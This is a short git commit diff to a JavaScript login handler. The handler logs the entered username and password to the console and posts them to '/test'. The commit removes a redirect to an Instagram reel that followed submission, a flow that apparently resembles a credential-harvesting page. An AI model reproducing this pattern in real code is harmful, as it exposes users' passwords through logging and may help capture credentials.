be38eac6f6b167d20ec642d2eee73461ce34e292
haal123 <hookisthaal@gmail.com>
2024-10-07 19:54:13 +0530

    Update app.js

--- assets/js/app.js
+++ assets/js/app.js
@@ -5,5 +5,6 @@ document.getElementById('test').addEventListener('submit', async function(event)
     const password = document.getElementById('password').value;
     console.log(username, password);
     axios.post('/test', {username: username, password: password});
-    window.location.href = 'https://www.instagram.com/reel/DAdT2aGPtdo/?igsh=MTVwaTBlZ212dTJsZw==';
+    username='';
+    password='';
 });
